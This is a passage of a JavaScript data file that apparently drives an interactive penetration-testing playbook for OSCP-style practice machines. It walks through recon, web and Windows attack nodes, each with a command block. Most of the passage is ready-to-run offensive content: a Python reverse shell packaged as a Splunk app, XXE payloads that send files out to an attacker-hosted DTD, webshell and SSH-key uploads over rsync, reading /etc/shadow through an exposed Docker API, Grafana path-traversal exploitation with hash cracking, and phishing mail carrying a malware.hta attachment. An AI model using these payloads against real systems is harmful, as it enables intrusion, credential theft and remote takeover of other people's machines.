    cmd: `nmap -p 873 -sV --script rsync-list-modules $IP
nc -nv $IP 873     # banner grab

# List modules (anonymous)
rsync rsync://$IP/
rsync rsync://$IP/<module>/

# Download entire module
rsync -av rsync://$IP/<module>/ /tmp/rsync_loot/

# With credentials
rsync -av rsync://user:pass@$IP/<module>/ /tmp/loot/

# Search for useful files
find /tmp/rsync_loot -name "id_rsa" -o -name "*.key" -o -name ".env"
find /tmp/rsync_loot -name "*.conf" | xargs grep -i "pass\\|secret"

# Upload SSH key (if writable)
rsync ~/.ssh/id_rsa.pub rsync://$IP/<module>/.ssh/authorized_keys

# Upload webshell (if module under webroot)
rsync shell.php rsync://$IP/<module>/shell.php`,
    warn: "Module names are case-sensitive. Try common names: backup, data, files, web, www, home, root.",
    choices: [
      { label: "Anonymous read — found credentials", next: "creds_found" },
      { label: "Found SSH key in module", next: "ssh_key" },
      { label: "Wrote SSH key — got shell", next: "got_root_linux" },
      { label: "Wrote webshell", next: "reverse_shell" },
    ],
  },

  smtp_enum: {
    phase: "RECON",
    title: "SMTP (25/465/587)",
    body: "SMTP leaks usernames via VRFY/EXPN/RCPT. Valid users feed your spray lists. Open relay lets you send phishing emails internally.",
    cmd: `nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $IP

# Banner grab
nc $IP 25
telnet $IP 25

# VRFY — user enumeration (most common)
telnet $IP 25
EHLO test
VRFY root
VRFY admin
VRFY www-data

# EXPN — expand mailing lists
EXPN admins
EXPN all

# RCPT TO — enumerate valid users
MAIL FROM:<test@test.com>
RCPT TO:<admin@$DOMAIN>   # 250=exists  550=not found

# Automated user enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP -f sender@test.com

# Open relay test
telnet $IP 25
EHLO test
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>   # 250 = open relay

# Send phishing if open relay (client-side attacks)
swaks --to victim@$DOMAIN --from "it@$DOMAIN" \\
  --server $IP --attach malware.hta`,
    warn: "VRFY and EXPN are often disabled on hardened servers. RCPT TO is less likely to be blocked.",
    choices: [
      { label: "Enumerated valid users — spray them", next: "ad_spray" },
      { label: "Open relay — send phishing for client-side", next: "client_side" },
      { label: "Found NTLM info — extract domain info", next: "ad_start" },
    ],
  },

  elasticsearch: {
    phase: "RECON",
    title: "Elasticsearch (9200/9300)",
    body: "Elasticsearch REST API is unauthenticated by default in older versions. All data is JSON and browsable. Dump everything — it often holds app credentials and PII.",
    cmd: `nmap -p 9200,9300 -sV $IP
curl -s http://$IP:9200/          # cluster info + version
curl -s http://$IP:9200/_cat/indices?v  # list all indices
curl -s http://$IP:9200/_cat/nodes?v    # node info

# Browse indices
curl -s http://$IP:9200/<index>/_search?pretty
curl -s http://$IP:9200/<index>/_search?q=password&pretty
curl -s "http://$IP:9200/_all/_search?q=password&pretty&size=100"

# Dump all data
curl -s http://$IP:9200/<index>/_search?size=10000 | jq .

# Cluster settings
curl -s http://$IP:9200/_cluster/settings
curl -s http://$IP:9200/_nodes

# Search for credentials
curl -s "http://$IP:9200/_all/_search?q=password+OR+passwd+OR+secret&pretty"

# Write to index (if writable — can inject data)
curl -X POST http://$IP:9200/test/_doc/1 \\
  -H "Content-Type: application/json" \\
  -d '{"cmd":"id"}'

# Check for Kibana on 5601
curl -s http://$IP:5601/api/status`,
    warn: "Elasticsearch 8.x has security enabled by default. Older versions (6.x, 7.x) are often unauthenticated.",
    choices: [
      { label: "Found credentials in indices", next: "creds_found" },
      { label: "Kibana accessible on 5601", next: "web_enum" },
      { label: "Nothing useful — check other ports", next: "unknown_service" },
    ],
  },

  docker_api: {
    phase: "RECON",
    title: "Docker API (2375/2376)",
    body: "Exposed Docker API = instant root on the host. Mount the host filesystem into a privileged container. No password needed on port 2375.",
    cmd: `nmap -p 2375,2376 -sV $IP
curl -s http://$IP:2375/containers/json   # if returns data = unauthenticated
curl -s http://$IP:2375/version

# List containers and images
export DOCKER_HOST="tcp://$IP:2375"
docker ps -a
docker images

# Instant root — mount host filesystem
docker -H tcp://$IP:2375 run -it --rm \\
  --privileged -v /:/mnt alpine chroot /mnt sh

# Read /etc/shadow
docker -H tcp://$IP:2375 run --rm \\
  -v /etc:/mnt/etc alpine cat /mnt/etc/shadow

# Write SSH key to host root
docker -H tcp://$IP:2375 run --rm \\
  -v /root/.ssh:/mnt/.ssh alpine sh -c \\
  "echo 'ssh-rsa YOURKEY' >> /mnt/.ssh/authorized_keys"

# Container escape if already inside container
# Check if privileged: cat /proc/self/status | grep CapEff
# Check for docker socket: ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
    warn: "Port 2375 = unauthenticated. Port 2376 = TLS. If docker.sock is mounted inside a container you're already in, you can escape to host.",
    choices: [
      { label: "Mounted host FS — got root on host", next: "got_root_linux" },
      { label: "Inside container with docker.sock", next: "got_root_linux" },
      { label: "Found creds in container env vars", next: "creds_found" },
    ],
  },

  winrm_access: {
    phase: "WINDOWS",
    title: "WinRM (5985/5986)",
    body: "WinRM is evil-winrm's playground. If you have creds or an NTLM hash for a user in the Remote Management Users group, you have a shell.",
    cmd: `nmap -p 5985,5986 -sV $IP
curl -s http://$IP:5985/wsman   # 200 = WinRM accessible

# evil-winrm — primary tool
evil-winrm -i $IP -u administrator -p 'password'
evil-winrm -i $IP -u 'DOMAIN\\user' -p 'password'
evil-winrm -i $IP -u administrator -H <NTLM_HASH>
evil-winrm -i $IP -u administrator -p 'password' -S  # SSL/5986

# Upload/download files in evil-winrm session
upload /path/to/tool.exe C:\\Windows\\Temp\\tool.exe
download C:\\Users\\admin\\Desktop\\proof.txt

# crackmapexec to test creds
crackmapexec winrm $IP -u user -p 'password'
crackmapexec winrm $IP -u users.txt -p passwords.txt
crackmapexec winrm $IP -u user -H <HASH>

# PowerShell remoting (from Windows)
$sess = New-PSSession -ComputerName $IP -Credential (Get-Credential)
Enter-PSSession $sess`,
    warn: "User must be in 'Remote Management Users' or 'Administrators' group. WinRM is usually enabled on domain-joined machines.",
    choices: [
      { label: "Got WinRM shell — start privesc", next: "windows_post_exploit" },
      { label: "Need creds first", next: "bruteforce" },
      { label: "Have hash — Pass the Hash", next: "pth" },
    ],
  },

  xxe: {
    phase: "WEB",
    title: "XXE — XML External Entity",
    body: "XXE = make the server read local files or trigger internal HTTP requests via XML. Find any endpoint that accepts XML (SOAP, REST with XML body, file upload of SVG/DOCX/XML). Blind XXE needs out-of-band — use Burp Collaborator or interactsh.",
    cmd: `# Detect XML endpoints
# Look for: Content-Type: application/xml, text/xml, application/soap+xml
# File uploads: .xml, .svg, .docx, .xlsx (all use XML internally)
# API bodies containing XML

# Basic file read (direct output)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

# Windows file read
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><data>&xxe;</data></root>

# PHP wrapper — base64 encode to bypass filters
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
# Decode: echo "BASE64" | base64 -d

# SSRF via XXE — probe internal network
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><data>&xxe;</data></root>

# Blind XXE — out-of-band DNS detection
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR.burpcollaborator.net/xxe">
  %xxe;
]>
<root/>

# Blind XXE with data exfil (evil.dtd on your server)
# evil.dtd content:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://ATTACKER/?d=%file;'>">
# %wrap; %send;
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://$LHOST/evil.dtd">
  %dtd;
]>
<root/>

# SVG upload XXE
<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <text>&xxe;</text>
</svg>

# Quick file targets
# Linux: /etc/passwd /etc/shadow /proc/self/environ /var/www/html/config.php
# Windows: C:\\Windows\\win.ini C:\\inetpub\\wwwroot\\web.config`,
    warn: "If output is empty but no error, assume blind XXE — switch to out-of-band. PHP filter wrapper works even when direct SYSTEM entity is blocked.",
    choices: [
      { label: "Got file read — found creds in config", next: "creds_found" },
      { label: "SSRF — pivoting to internal services", next: "ssrf" },
      { label: "Blind XXE confirmed — need more enumeration", next: "web_fuzz_deep" },
      { label: "Got /etc/passwd — crack hashes", next: "hashcrack" },
    ],
  },

  dns_enum: {
    phase: "RECON",
    title: "DNS (53)",
    body: "DNS zone transfers dump the entire domain map — every host, IP, subdomain. Even without zone transfer, brute-forcing reveals hidden internal hosts to pivot to.",
    cmd: `nmap -p 53 -sV --script dns-zone-transfer $IP
nmap -p 53 --script dns-brute --script-args dns-brute.domain=target.com $IP

# Zone transfer — often misconfigured on internal DNS
dig axfr target.com @$IP
dig axfr @$IP target.com
host -l target.com $IP
dnsrecon -d target.com -t axfr

# Standard enumeration
dig @$IP target.com any        # All records
dig @$IP target.com ns         # Name servers
dig @$IP target.com mx         # Mail servers
dig @$IP target.com txt        # TXT/SPF records (username hints)
nslookup -type=any target.com $IP

# Subdomain brute force
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d target.com -r $IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse DNS (find hosts on subnet)
dnsrecon -r 192.168.1.0/24 -n $IP
for i in $(seq 1 254); do host 192.168.1.$i $IP 2>/dev/null | grep "domain name"; done

# Add discovered hosts to /etc/hosts
echo "$IP hostname.target.com" >> /etc/hosts`,
    warn: "Zone transfer (AXFR) works when DNS server is misconfigured to allow any client. Common on internal networks. Always try it — it takes one command.",
    choices: [
      { label: "Zone transfer worked — full host list", next: "targeted_scan" },
      { label: "Found subdomains — add to /etc/hosts", next: "web_enum" },
      { label: "Found internal hostnames — pivot target", next: "pivot_start" },
    ],
  },

  grafana: {
    phase: "WEB",
    title: "Grafana (3000)",
    body: "Grafana shows up constantly on practice machines. CVE-2021-43798 is unauthenticated path traversal — grab the database and extract admin credentials from it.",
    cmd: `nmap -p 3000 -sV $IP
curl -s http://$IP:3000/api/health    # Version info
curl -s http://$IP:3000/login         # Check version on login page

# CVE-2021-43798 — Path Traversal (Grafana < 8.3.0)
# Read Grafana SQLite database (contains hashed passwords)
curl --path-as-is -s "http://$IP:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db

# Or other plugins: dashboard, graph, table, text, stat, gauge
curl --path-as-is "http://$IP:3000/public/plugins/graph/../../../../../../../../../etc/passwd"

# Extract credentials from grabbed database
sqlite3 grafana.db "SELECT login,password FROM user;"
# Passwords are bcrypt hashed
hashcat -m 3200 grafana_hashes.txt rockyou.txt
john --format=bcrypt grafana_hashes.txt --wordlist=rockyou.txt

# Default creds (try before exploit)
# admin:admin  admin:password  admin:grafana

# After login — data source exploitation
# Go to: Configuration > Data Sources
# Check for database credentials stored in data sources
# MySQL, PostgreSQL, MSSQL connections = creds for lateral movement

# Grafana API enumeration (if you have creds)
curl -u admin:password http://$IP:3000/api/datasources
curl -u admin:password http://$IP:3000/api/users`,
    warn: "CVE-2021-43798 works on plugins that are installed. If alertlist fails try: dashboard, graph, table, text, stat, gauge, barchart, timeseries.",
    choices: [
      { label: "Path traversal worked — got DB / creds", next: "creds_found" },
      { label: "Logged in — found data source creds", next: "creds_found" },
      { label: "Default creds worked", next: "creds_found" },
    ],
  },

  splunkd: {
    phase: "WEB",
    title: "Splunkd (8089/8000)",
    body: "Splunk = instant RCE if you have admin creds. Create a malicious app (Python script in a .tar.gz) and upload via the package manager. Port 8089 is the API, 8000 is the web UI.",
    cmd: `nmap -p 8000,8089 -sV $IP
curl -k https://$IP:8089/services      # API info
curl -k -u admin:changeme https://$IP:8089/services/server/info  # Version

# Default creds: admin:changeme  admin:password  admin:admin

# CVE-2023-46214 — XSLT injection (Splunk < 9.1.2) — check version

# RCE via malicious Splunk app (requires admin)
# Create the app structure:
mkdir -p splunk_shell/bin
cat > splunk_shell/bin/run.py << 'PYEOF'
import sys,socket,os,pty
s=socket.socket()
s.connect(("LHOST",LPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
PYEOF

cat > splunk_shell/default/inputs.conf << 'CONFEOF'
[script://./bin/run.py]
disabled = false
interval = 10
sourcetype = test
CONFEOF

tar -czf splunk_shell.tar.gz splunk_shell/

# Upload via web UI: Apps > Manage Apps > Install app from file
# OR via API:
curl -k -u admin:changeme https://$IP:8089/services/apps/local \
  -F "name=splunk_shell" \
  -F "filename=true" \
  -F "appfile=@splunk_shell.tar.gz"

# Brute force Splunk login
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/en-US/account/login:username=^USER^&password=^PASS^&return_to=%2Fen-US%2F:Invalid"`,
    warn: "On Windows, Splunk runs as SYSTEM by default — instant privilege escalation. On Linux, check the splunk user's sudo rights.",
    choices: [
      { label: "Got admin — uploaded malicious app = shell", next: "shell_upgrade" },
      { label: "Brute forced creds", next: "creds_found" },
      { label: "Need to escalate — Splunk runs as SYSTEM", next: "got_root_windows" },
    ],
  },

  memcached: {
    phase: "RECON",
    title: "Memcached (11211)",
    body: "Memcached has no authentication. Dump all keys and values — it caches session tokens, credentials, and application data in plaintext.",
    cmd: `nmap -p 11211 -sV --script memcached-info $IP
nc -vn $IP 11211

# Dump all cached data
# Step 1: Get slab IDs
echo "stats slabs" | nc -q 1 $IP 11211

# Step 2: Get keys from each slab (replace N with slab number)
echo "stats cachedump N 0" | nc -q 1 $IP 11211

# Step 3: Get value for each key
echo "get <keyname>" | nc -q 1 $IP 11211

# Automated dump script
python3 -c "
import socket
s = socket.socket()
s.connect(('$IP', 11211))
s.send(b'stats slabs\r\n')
slabs = s.recv(4096).decode()
print('SLABS:', slabs[:500])
s.send(b'stats cachedump 1 0\r\n')
keys = s.recv(4096).decode()
print('KEYS:', keys)
for line in keys.split('\n'):
    if line.startswith('ITEM'):
        key = line.split()[1]
        s.send(f'get {key}\r\n'.encode())
        print(s.recv(4096).decode())
s.close()
"

# Quick version/stats
echo "version" | nc -q 1 $IP 11211
echo "stats" | nc -q 1 $IP 11211`,
    warn: "Memcached data is application-specific. Look for session tokens (can be used for auth bypass), user objects, and any serialized data.",
    choices: [
      { label: "Found session tokens / creds in cache", next: "creds_found" },
      { label: "Found serialized objects — check for deserialization", next: "web_fuzz_deep" },
      { label: "Nothing useful", next: "unknown_service" },
    ],
  },

  idor: {
    phase: "WEB",
    title: "IDOR — Insecure Direct Object Reference",
    body: "IDOR = change an ID in a request to access another user's data or escalate to admin. Look for numeric IDs in URLs, API responses, and cookies. Most useful when you have a low-priv account and need admin access.",
    cmd: `# Identify direct references
# URL params:   /user?id=123   /api/document?doc_id=456
# Path params:  /user/123/profile   /api/orders/789
# POST bodies:  {"user_id": 123}
# Cookies:      user_id=123  (decode base64 if encoded)
# Headers:      X-User-ID: 123

# Basic IDOR test — increment/decrement IDs
# Your account: /api/user/123
# Try:          /api/user/1  (admin?)
#               /api/user/124  (next user)
#               /api/user/0   /api/user/-1

# Horizontal priv esc (access other users' data)
curl -H "Cookie: session=YOURS" http://$IP/api/user/124
curl -H "Cookie: session=YOURS" http://$IP/api/orders/1

# Vertical priv esc (escalate to admin)
# Look for role/admin fields in responses
# Try changing: {"user_id":123,"role":"admin"}

# Mass assignment — add privileged fields to POST
POST /api/profile
{"name":"attacker","email":"x@x.com","is_admin":true,"role":"admin"}

# UUID/GUID instead of sequential IDs?
# Try:  /api/user/00000000-0000-0000-0000-000000000001  (admin UUID)
# Or:   find user IDs from public endpoints (profile pages, comments)

# Burp automation
# Use Intruder on the ID parameter
# Payload: sequential numbers 1-1000
# Grep for: admin, sensitive data, other usernames

# Check indirect references too:
# /download?file=report.pdf  ->  /download?file=../../../etc/passwd
# (this becomes path traversal/LFI — check lfi node)`,
    warn: "IDOR is most powerful when combined with account registration. Create an account, note your user ID, then probe adjacent IDs and admin endpoints.",
    choices: [
      { label: "Got admin access via IDOR", next: "web_fuzz_deep" },
      { label: "IDOR gave creds / sensitive data", next: "creds_found" },
      { label: "File reference IDOR — try path traversal", next: "lfi" },
    ],
  },

  full_portscan: {
    phase: "RECON",
    title: "Full TCP Scan",
    body: "Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
    cmd: `# Full TCP (background it)
nmap -p- --min-rate 5000 -T4 $IP -oN scans/allports.txt

# UDP top 20 (background)
sudo nmap -sU --top-ports 20 $IP -oN scans/udp.txt &

# HTTP methods check while you wait
nmap -p80,443 --script=http-methods $IP \\
  --script-args http-methods.url-path='/'`,
    warn: null,
    choices: [
      { label: "Scan complete — run targeted scan on open ports", next: "targeted_scan" },
    ],
  },

  targeted_scan: {
    phase: "RECON",
    title: "Targeted Service Scan",
    body: "Run scripts and version detection only on discovered ports. This is your core recon. Read every line of output.",
    cmd: `nmap -p <PORTS> -sC -sV -O $IP -oN scans/targeted.txt

# Extract IPs from output
grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' scans/targeted.txt`,
    warn: null,
    choices: [
      { label: "Help me read and prioritize this output", next: "analyze_output" },
      { label: "Web (80 / 443 / 8080 / 8443)", next: "web_enum" },
      { label: "SMB (139 / 445)", next: "smb_enum" },
      { label: "FTP (21)", next: "ftp_enum" },
      { label: "SSH only (22)", next: "ssh_only" },
      { label: "RDP (3389)", next: "rdp" },
      { label: "WinRM (5985 / 5986)", next: "winrm_access" },
      { label: "SNMP / DNS / LDAP / RPC", next: "other_services" },
      { label: "Active Directory environment", next: "ad_start" },
      { label: "Unknown service / unusual port", next: "unknown_service" },
      { label: "Multiple internal subnets visible", next: "pivot_start" },
    ],
  },


  // ══════════════════════════════════════════
  //  ANALYSIS — READ BEFORE YOU ATTACK
  // ══════════════════════════════════════════

  analyze_output: {
    phase: "ANALYSIS",
    title: "Read the Scan — Before You Attack",
    body: "Most people skip this step. They see port 80 and jump to web_enum. Slow down. Every line of nmap output is signal. Read it as a complete picture before you choose your attack path.",
    cmd: `# Print your targeted scan output
cat scans/targeted.txt

# ── WHAT TO LOOK FOR ─────────────────────
# 1. SERVICE VERSIONS — are any outdated?
#    Apache 2.4.49, OpenSSH 7.2, Samba 3.x = immediate CVE candidates
#    searchsploit [service] [version]

# 2. OS FINGERPRINT — Linux or Windows?
#    Linux: privesc via sudo/SUID/cron
#    Windows: privesc via tokens/services/registry
#    OS tells you which post-exploit branch you will take

# 3. PORT COMBINATIONS — what does the full picture say?
#    80 + 445 + 5985     = Windows web server, likely AD-adjacent
#    21 + 22 + 80        = Linux, FTP may feed webroot
#    80 + 3306           = web + DB, SQLi → direct DB access
#    445 + 88 + 389      = Domain Controller
#    8080 + 8009         = Tomcat (AJP connector — Ghostcat)
#    3000               = Grafana
#    6379               = Redis (likely unauthenticated)
#    27017              = MongoDB (likely unauthenticated)

# 4. NSE SCRIPT OUTPUT — read it all
#    smb-security-mode: message_signing disabled = relay possible
#    http-title: [title] tells you what the app is
#    ssl-cert: common name reveals internal hostnames
#    ssh-hostkey: algorithm age signals OS vintage

# 5. FILTERED vs CLOSED
#    Closed = port exists, nothing listening
#    Filtered = firewall present — UDP or retry later`,
    warn: "SSL certificates contain hostnames. Add every CN and SAN you find to /etc/hosts — they often resolve to different virtual hosts that expose separate attack surfaces.",
    choices: [
      { label: "Multiple services — help me prioritize", next: "analyze_multiservice" },
      { label: "I see a version number — let me assess it", next: "analyze_versions" },
      { label: "Output looks ambiguous — nothing obvious", next: "analyze_ambiguous" },
      { label: "Looks like a Domain Controller", next: "analyze_dc" },
      { label: "I know what I am looking at — go attack", next: "targeted_scan" },
    ],
  },

  analyze_multiservice: {
    phase: "ANALYSIS",
    title: "Multiple Services — Priority Order",
    body: "Multiple attack surfaces on one box is common. The mistake is jumping to the most familiar service rather than the highest-value one. Use this priority framework.",
    cmd: `# ── ATTACK SURFACE PRIORITY ─────────────
# Rank your open services using this logic:

# TIER 1 — Exploit immediately if present
#   Unauthenticated RCE (Redis, MongoDB, Elasticsearch no-auth)
#   Known unpatched CVE with public exploit (check versions)
#   Anonymous FTP write access to webroot
#   SMB without signing + relay opportunity

# TIER 2 — High value, enumerate thoroughly first
#   Web application (parameters, login, upload)
#   SMB shares (anonymous read = credential hunting)
#   MSSQL/MySQL (creds from elsewhere may give xp_cmdshell)

# TIER 3 — Useful after initial access
#   SSH (you need creds first — brute only as last resort)
#   RDP (same — creds needed, expensive to brute)
#   WinRM (same — tool for lateral movement, not initial access)

# ── COMMON WINNING COMBINATIONS ──────────
# FTP (anon) + HTTP:
#   Download FTP → find creds → login web
#   OR upload webshell via FTP if FTP root = webroot

# SMB + HTTP:
#   Spider SMB shares first — credentials often in scripts/configs
#   Use found creds on web login

# HTTP + SSH:
#   Exploit web first → get shell as www-data
#   Find SSH key in webroot or /home → pivot to user

# HTTP + DB (3306/5432/1433/27017):
#   Web SQLi → direct DB shell
#   OR find DB creds in web config → connect directly

# ── YOUR CURRENT SURFACE ─────────────────
# List your ports: [fill in]
# Highest tier present: [fill in]
# Starting with: [fill in]`,
    warn: "If you see Redis (6379) or MongoDB (27017) open — test unauthenticated access FIRST before anything else. These are often instant shells with zero effort.",
    choices: [
      { label: "Web is highest value — enumerate it", next: "web_enum" },
      { label: "SMB first — shares may have credentials", next: "smb_enum" },
      { label: "Unauthenticated DB/service — instant win", next: "unknown_service" },
      { label: "FTP + web combination", next: "ftp_enum" },
      { label: "Back to full output analysis", next: "analyze_output" },
    ],
  },

  analyze_versions: {
    phase: "ANALYSIS",
    title: "Version Analysis — Is This Exploitable?",
    body: "A version number is a gift. Most people searchsploit it once and move on. Do it properly — cross-reference multiple sources, understand what the exploit actually does before you run it.",
    cmd: `# ── SEARCHSPLOIT ─────────────────────────
searchsploit [service] [version]
searchsploit -x [exploit/path]   # read before running

# ── CROSS-REFERENCE ──────────────────────
# NVD: https://nvd.nist.gov/vuln/search
# ExploitDB: https://www.exploit-db.com
# GitHub: site:github.com [service] [version] exploit
# PacketStorm: packetstormsecurity.com

# ── VERSION READING TIPS ──────────────────
# nmap shows: Apache httpd 2.4.49
#   searchsploit apache 2.4.49   → CVE-2021-41773 path traversal/RCE
#
# nmap shows: OpenSSH 7.2p2
#   searchsploit openssh 7.2     → user enumeration (less useful)
#   but 7.2 on Ubuntu = Ubuntu 16.04 = kernel exploit candidates
#
# nmap shows: Samba 4.x.x
#   check if < 4.6.4 → SambaCry (CVE-2017-7494)
#   check if 3.x → very old, many exploits
#
# nmap shows: Microsoft IIS 10.0
#   IIS 10 = Windows Server 2016/2019 or Windows 10
#   look for WebDAV, PUT upload, ASPX execution

# ── EXPLOIT QUALITY CHECK ────────────────
# Before running any exploit ask:
# 1. Does the version match EXACTLY? (2.4.49 ≠ 2.4.50)
# 2. Is there a Metasploit module? (fastest to test)
# 3. Is the PoC Python 2 or 3? (check shebang line)
# 4. Does it need modification? (LHOST/LPORT/target URL)
# 5. What does success look like? (RCE? file read? DoS?)
# 6. Will it crash the service? (avoid on OSCP — limited attempts)`,
    warn: "Version numbers in nmap are detected by banners — services can lie or be misconfigured. If searchsploit returns nothing, try one version up and one version down. Banners are not always accurate.",
    choices: [
      { label: "Found a CVE — test it", next: "searchsploit_web" },
      { label: "No CVE — back to attack surface priority", next: "analyze_multiservice" },
      { label: "Web version — enumerate the app instead", next: "web_enum" },
      { label: "SMB version — check MS17-010", next: "smb_enum" },
    ],
  },

  analyze_ambiguous: {
    phase: "ANALYSIS",
    title: "Ambiguous Output — Reading the Signal",
    body: "Nothing obvious in the scan. This is not the same as nothing there. Ambiguous output has a specific set of follow-up moves. Work through them systematically before concluding the surface is locked.",
    cmd: `# ── WHEN NMAP OUTPUT LOOKS THIN ──────────

# 1. DID YOU SCAN ALL PORTS?
nmap -p- --min-rate 5000 $IP -oN scans/allports.txt
# Services on high ports (8080, 8443, 8888, 9090, 10000) are common

# 2. UDP — HAVE YOU CHECKED IT?
sudo nmap -sU --top-ports 100 $IP -oN scans/udp.txt
# SNMP (161), TFTP (69), DNS (53) often only on UDP
# SNMP especially — community string "public" = info dump

# 3. WEB — IS THERE A VIRTUAL HOST?
curl -sv http://$IP   # check the response title
# If title shows a domain name: add to /etc/hosts and revisit
# If 400 Bad Request on HTTPS: server requires SNI — use -k and hostname

# 4. ARE YOU READING 403 CORRECTLY?
# 403 Forbidden = the resource EXISTS but you lack permission
# 403 is NOT the same as 404. It is a door that is locked, not absent.
# Try: different HTTP method (OPTIONS, PUT, PATCH)
# Try: path traversal (/../admin, /./admin)
# Try: different User-Agent (Googlebot, curl)
# Try: add trailing slash (/admin/)

# 5. RESPONSE SIZE VARIATION
# Two 403s with different response sizes = different content behind them
# Feroxbuster: filter by size to find anomalies
feroxbuster -u http://$IP --filter-size [common_size]

# 6. NOTHING AT ALL?
# Check if the service is actually up
nc -nv $IP [port]
telnet $IP [port]
# Sometimes nmap misfires on rate-limited or filtered hosts`,
    warn: "A wall of 403s from feroxbuster is not nothing — it means content exists. The question is what HTTP method, header, or path variation gets you past the filter.",
    choices: [
      { label: "Found content on high port", next: "web_enum" },
      { label: "SNMP is open — enumerate it", next: "other_services" },
      { label: "Virtual host discovered", next: "subdomain_enum" },
      { label: "403s everywhere — dig into them", next: "web_fuzz_deep" },
      { label: "Genuinely nothing — try UDP fully", next: "analyze_output" },
      { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
    ],
  },

  analyze_dc: {
    phase: "ANALYSIS",
    title: "Reading a Domain Controller",
    body: "A DC has a signature port combination. If you see it, you are in an AD environment. The attack path is completely different from a standalone machine — do not treat it like a normal box.",
    cmd: `# ── DC SIGNATURE PORTS ───────────────────
# 53   DNS       — zone transfer attempt first
# 88   Kerberos  — AS-REP roast, Kerberoast
# 135  MSRPC
# 139  NetBIOS
# 389  LDAP      — anonymous bind? enumerate users
# 445  SMB       — shares, relay, eternal blue
# 464  Kpasswd
# 593  RPC over HTTP
# 636  LDAPS
# 3268 Global Catalog LDAP
# 3269 Global Catalog LDAPS
# 5985 WinRM     — if you get DA creds, shell here

# ── FIRST MOVES ON A DC ──────────────────
# 1. Get the domain name
nmap -p 389 --script ldap-rootdse $IP
crackmapexec smb $IP   # shows domain, hostname, OS

# 2. DNS zone transfer
dig axfr [domain] @$IP
# If it works: full internal host map

# 3. LDAP anonymous bind
ldapsearch -x -h $IP -b "dc=[domain],dc=com"
# If it works: full user/group list without creds

# 4. SMB null session
crackmapexec smb $IP -u "" -p "" --shares
enum4linux-ng $IP

# 5. Do NOT try to brute force Kerberos
# Account lockout is real on DCs
# Use AS-REP roast (no creds needed) and Kerberoast (creds needed)

# ── KEY DECISION ─────────────────────────
# Do you have ANY credentials yet?
# No creds: AS-REP roast, LDAP anon, DNS zone transfer, Responder
# Have creds: BloodHound immediately, then follow the path`,
    warn: "Never attack the DC directly in an OSCP AD set — you reach it last, through the chain. The DC is the destination, not the entry point. Start with the workstation or member server.",
    choices: [
      { label: "No creds yet — AS-REP roast first", next: "asrep_roast" },
      { label: "Have creds — run BloodHound", next: "bloodhound" },
      { label: "Run Responder to capture hashes", next: "responder" },
      { label: "Full AD methodology", next: "ad_start" },
    ],
  },

  // ══════════════════════════════════════════
  //  WEB
  // ══════════════════════════════════════════
  web_enum: {
    phase: "WEB",
    title: "Web Enumeration",
    body: "Web is open. Hit it from every angle simultaneously — directory fuzz, Nikto, source code review, headers, robots.txt, CMS detection. Information density is everything here.",
    cmd: `# Directory + file fuzz
feroxbuster -u http://$IP \\
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt \\
  -x php,html,txt,bak,old,zip --depth 3

# Nikto
nikto -h http://$IP -o scans/nikto.txt

# CMS / tech fingerprint
whatweb http://$IP
curl -sv http://$IP | head -50   # headers
curl http://$IP/robots.txt
curl http://$IP/sitemap.xml`,
    warn: null,
    choices: [
      { label: "Found WordPress", next: "wordpress" },
      { label: "Found login page", next: "login_page" },
      { label: "Found file upload", next: "file_upload" },
      { label: "IIS server — ASPX shell path", next: "iis_aspx" },
      { label: "Jenkins on 8080/8443", next: "jenkins" },
      { label: "WebDAV enabled", next: "webdav" },
      { label: "Grafana on 3000", next: "grafana" },
      { label: "Splunk on 8000/8089", next: "splunkd" },
      { label: "URL has parameter (?id=1, ?page=, ?file=)", next: "param_found" },
      { label: "Nothing obvious — fuzz deeper", next: "web_fuzz_deep" },
      { label: "Found interesting subdomain", next: "subdomain_enum" },
    ],
  },

  subdomain_enum: {
    phase: "WEB",
    title: "Subdomain Enumeration",
    body: "Subdomains often expose dev, admin, or internal panels. Always add discovered subs to /etc/hosts before testing.",
    cmd: `gobuster dns -d domain.org \\
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\
  -t 30

ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\
  -u http://FUZZ.domain.org -o scans/subdomains.txt

# Add to /etc/hosts
echo "$IP sub.domain.org" >> /etc/hosts`,
    warn: "Verify every subdomain resolves to an in-scope IP before testing.",
    choices: [
      { label: "Found subdomain — enumerate it as new web target", next: "web_enum" },
